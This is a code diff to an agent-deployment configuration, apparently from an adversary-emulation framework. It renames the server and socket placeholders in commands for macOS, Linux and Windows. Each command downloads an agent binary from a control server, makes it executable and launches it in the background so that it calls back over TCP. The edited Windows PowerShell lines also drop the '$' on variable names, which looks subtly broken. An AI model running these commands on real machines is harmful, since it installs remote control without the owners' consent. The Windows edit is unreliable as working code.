@@ -11,24 +11,24 @@
     darwin:
       sh:
         command: |
-          server="#{server}";
-          socket="#{socket}";
+          server="#{app.http}";
+          socket="#{app.tcp}";
           contact="tcp";
           agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
           nohup ./$agent -http $server -socket $socket -contact $contact &
     linux:
       sh:
         command: |
-          server=#{server};
-          socket=#{socket};
+          server="#{app.http}";
+          socket="#{app.tcp}";
           contact="tcp";
           agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
           nohup ./$agent -http $server -socket $socket -contact $contact &
     windows:
       psh:
         command: |
-          $server="#{server}";
-          $socket="#{socket}";
+          server="#{app.http}";
+          socket="#{app.tcp}";
           $contact="tcp";
           $url="$server/file/download";
           $wc=New-Object System.Net.WebClient;
